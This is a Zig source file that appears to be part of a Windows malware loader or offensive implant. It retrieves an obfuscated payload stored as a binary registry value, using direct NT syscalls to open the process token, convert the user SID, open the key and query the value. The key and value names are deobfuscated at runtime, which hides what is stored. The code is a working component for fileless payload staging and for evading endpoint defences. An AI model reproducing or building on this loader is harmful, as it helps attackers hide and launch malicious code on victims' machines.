const std = @import("std");
const windows = std.os.windows;
const config = @import("config");
const Apis = @import("api.zig").Apis;
const Syscalls = @import("syscall.zig").Syscalls;
const win32 = @import("win32.zig");
const mem = @import("helper/mem.zig");
const obfs = @import("helper/obfs.zig");
const deobfsBytes = obfs.deobfsBytes;
const deobfsBytesRt = obfs.deobfsBytesRt;
const string = @import("helper/string.zig");

pub const RegistryResult = struct {
    data: []u8,
    size: usize,

    const Self = @This();

    pub fn init(data: []u8, size: usize) Self {
        return Self{
            .data = data,
            .size = size,
        };
    }

    pub fn deinit(self: *Self, syscalls: Syscalls) void {
        mem.ntFree(syscalls, self.data);
    }
};

const TokenUser = extern struct {
    User: SidAndAttributes,
};

const SidAndAttributes = extern struct {
    Sid: *anyopaque,
    Attributes: u32,
};

pub fn sidToString(syscalls: Syscalls, sid: *anyopaque) ![]u8 {
    const sid_ptr = @as([*]u8, @ptrCast(sid));
    
    const revision = sid_ptr[0];
    const sub_authority_count = sid_ptr[1];
    const authority = std.mem.readInt(u48, sid_ptr[2..8], .big);
    
    var buffer = try mem.DynamicBuffer.init(syscalls, 256);
    errdefer buffer.deinit();
    
    var temp_buffer: [32]u8 = undefined;
    const initial_part = try std.fmt.bufPrint(&temp_buffer, "S-{d}-{d}", .{ revision, authority });
    try buffer.append(initial_part);
    
    var i: u8 = 0;
    while (i < sub_authority_count) : (i += 1) {
        const offset = 8 + (i * 4);
        const sub_authority = std.mem.readInt(u32, sid_ptr[offset..offset + 4][0..4], .little);
        
        var sub_buffer: [16]u8 = undefined;
        const sub_part = try std.fmt.bufPrint(&sub_buffer, "-{d}", .{sub_authority});
        try buffer.append(sub_part);
    }
    
    return buffer.toOwnedSlice(); // needs to be freed by caller
}

pub fn getCurrentUserSid(syscalls: Syscalls) ![]u8 {
    var h_token: windows.HANDLE = undefined;
    var status = syscalls.NtOpenProcessToken.?.syscall4(
        @intFromPtr(win32.NtCurrentProcess()),
        @as(usize, win32.TOKEN_QUERY),
        @intFromPtr(&h_token),
        0, // unused
    );
    if (status != 0) {
        return error.TokenError;
    }
    defer _ = syscalls.NtClose.?.syscall4(
        @intFromPtr(h_token),
        0, 0, 0,
    );
    
    var return_length: u32 = 0;
    status = syscalls.NtQueryInformationToken.?.syscall6(
        @intFromPtr(h_token),
        @intFromEnum(win32.TOKEN_INFORMATION_CLASS.TokenUser),
        0, // null
        0,
        @intFromPtr(&return_length),
        0, // unused
    );
    if (status != win32.STATUS_BUFFER_TOO_SMALL) {
        return error.QueryTokenError;
    }

    const buffer = try mem.ntAlloc(
        syscalls,
        null,
        return_length,
        windows.MEM_COMMIT | windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    );
    defer _ = mem.ntFree(syscalls, buffer);
    
    status = syscalls.NtQueryInformationToken.?.syscall6(
        @intFromPtr(h_token),
        @intFromEnum(win32.TOKEN_INFORMATION_CLASS.TokenUser),
        @intFromPtr(buffer.ptr),
        @as(usize, return_length),
        @intFromPtr(&return_length),
        0, // unused
    );
    if (status != win32.STATUS_SUCCESS) {
        return error.QueryTokenError;
    }
    
    const token_user = @as(*const TokenUser, @ptrCast(@alignCast(buffer.ptr)));
    const sid = token_user.User.Sid;
    
    return try sidToString(syscalls, sid);
}

fn convertToNtPath(syscalls: Syscalls, reg_key: []const u8) ![]u8 {
    var buffer = try mem.DynamicBuffer.init(syscalls, 256);

    if (std.mem.startsWith(u8, reg_key, "HKEY_LOCAL_MACHINE\\") or std.mem.startsWith(u8, reg_key, "HKLM\\")) {

        const suffix = if (std.mem.startsWith(u8, reg_key, "HKEY_LOCAL_MACHINE\\"))
            reg_key[19..]
        else 
            reg_key[5..];
        try buffer.append("\\Registry\\Machine\\");
        try buffer.append(suffix);

    } else if (std.mem.startsWith(u8, reg_key, "HKEY_CURRENT_USER\\") or std.mem.startsWith(u8, reg_key, "HKCU\\")) {

        const suffix = if (std.mem.startsWith(u8, reg_key, "HKEY_CURRENT_USER\\"))
            reg_key[18..]
        else 
            reg_key[5..];

        // Get the current user SID
        const user_sid = try getCurrentUserSid(syscalls);
        defer mem.ntFree(syscalls, user_sid);

        try buffer.append("\\Registry\\User\\");
        try buffer.append(user_sid);
        try buffer.append("\\");
        try buffer.append(suffix);

    } else if (std.mem.startsWith(u8, reg_key, "HKEY_CLASSES_ROOT\\") or std.mem.startsWith(u8, reg_key, "HKCR\\")) {

        const suffix = if (std.mem.startsWith(u8, reg_key, "HKEY_CLASSES_ROOT\\"))
            reg_key[18..]
        else 
            reg_key[5..];
        try buffer.append("\\Registry\\Machine\\SOFTWARE\\Classes\\");
        try buffer.append(suffix);

    } else if (std.mem.startsWith(u8, reg_key, "HKEY_USERS\\") or std.mem.startsWith(u8, reg_key, "HKU\\")) {

        const suffix = if (std.mem.startsWith(u8, reg_key, "HKEY_USERS\\"))
            reg_key[11..]
        else 
            reg_key[4..];
        try buffer.append("\\Registry\\User\\");
        try buffer.append(suffix);

    } else if (std.mem.startsWith(u8, reg_key, "\\Registry\\")) {

        try buffer.append(reg_key);

    } else {

        return error.InvalidRegistryPath;

    }

    return buffer.toOwnedSlice(); // needs to be freed by caller
}

pub fn openRegistryKey(
    apis: Apis,
    syscalls: Syscalls,
    reg_key: []const u8,
) !windows.HANDLE {
    var h_key: ?windows.HANDLE = null;
    
    const reg_key_w = try string.utf8ToUtf16Z(syscalls, reg_key);
    defer mem.ntFree(syscalls, @as([*]u8, @ptrCast(reg_key_w.ptr))[0..reg_key_w.len * 2]);
    
    var reg_key_us: windows.UNICODE_STRING = undefined;
    apis.RtlInitUnicodeString.?(&reg_key_us, @ptrCast(reg_key_w.ptr));
    
    var obj_attrs = win32.OBJECT_ATTRIBUTES{
        .Length = @sizeOf(win32.OBJECT_ATTRIBUTES),
        .RootDirectory = null,
        .ObjectName = &reg_key_us,
        .Attributes = windows.OBJ_CASE_INSENSITIVE,
        .SecurityDescriptor = null,
        .SecurityQualityOfService = null,
    };
    
    const status = syscalls.NtOpenKey.?.syscall4(
        @intFromPtr(&h_key),
        @as(usize, windows.KEY_READ),
        @intFromPtr(&obj_attrs),
        0, // unused
    );
    if (status != win32.STATUS_SUCCESS or h_key == null) {
        return error.RegistryKeyOpenFailed;
    }
    
    return h_key.?;
}

pub fn getRegistryBinaryValue(
    apis: Apis,
    syscalls: Syscalls,
    h_key: windows.HANDLE,
    value_name: []const u8,
) !RegistryResult {
    const value_name_w = try string.utf8ToUtf16Z(syscalls, value_name);
    defer mem.ntFree(syscalls, @as([*]u8, @ptrCast(value_name_w.ptr))[0..value_name_w.len * 2]);
    
    var value_name_us: windows.UNICODE_STRING = undefined;
    apis.RtlInitUnicodeString.?(&value_name_us, @ptrCast(value_name_w.ptr));
    
    var required_size: u32 = undefined;
    var status = syscalls.NtQueryValueKey.?.syscall6(
        @intFromPtr(h_key),
        @intFromPtr(&value_name_us),
        @intFromEnum(win32.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
        0, // null
        0,
        @intFromPtr(&required_size),
    );
    if (status != win32.STATUS_BUFFER_TOO_SMALL) {
        return error.RegistryValueQueryFailed;
    }

    const buffer = try mem.ntAlloc(
        syscalls,
        null,
        required_size,
        windows.MEM_COMMIT | windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    );
    defer mem.ntFree(syscalls, buffer);
    
    status = syscalls.NtQueryValueKey.?.syscall6(
        @intFromPtr(h_key),
        @intFromPtr(&value_name_us),
        @intFromEnum(win32.KEY_VALUE_INFORMATION_CLASS.KeyValuePartialInformation),
        @intFromPtr(buffer.ptr),
        @intCast(required_size),
        @intFromPtr(&required_size),
    );
    if (status != win32.STATUS_SUCCESS) {
        return error.RegistryValueQueryFailed;
    }
    
    const value_info: *win32.KEY_VALUE_PARTIAL_INFORMATION = @ptrCast(@alignCast(buffer.ptr));
    if (value_info.Type != win32.REG_BINARY) {
        return error.NotBinaryValue;
    }

    const result_data = try mem.ntAlloc(
        syscalls,
        null,
        value_info.DataLength,
        windows.MEM_COMMIT | windows.MEM_RESERVE,
        windows.PAGE_READWRITE,
    );
    errdefer mem.ntFree(syscalls, result_data);

    const header_size = @sizeOf(win32.KEY_VALUE_PARTIAL_INFORMATION);
    const source_data = @as([*]u8, @ptrCast(buffer.ptr)) + header_size;
    @memcpy(result_data[0..value_info.DataLength], source_data[0..value_info.DataLength]);
    
    return RegistryResult.init(result_data, value_info.DataLength);
}

pub fn loadPayloadViaRegistry(apis: Apis, syscalls: Syscalls) !RegistryResult {
    const reg_key = deobfsBytes(config.reg_key_obfs.len, config.reg_key_obfs, config.obfs_key);
    const reg_value = deobfsBytes(config.reg_value_obfs.len, config.reg_value_obfs, config.obfs_key);

    const reg_key_nt = try convertToNtPath(syscalls, reg_key[0..]);
    defer mem.ntFree(syscalls, reg_key_nt);

    const h_key = try openRegistryKey(apis, syscalls, reg_key_nt[0..]);
    defer _ = syscalls.NtClose.?.syscall4(
        @intFromPtr(h_key),
        0, 0, 0,
    );

    return getRegistryBinaryValue(apis, syscalls, h_key, reg_value[0..]);
}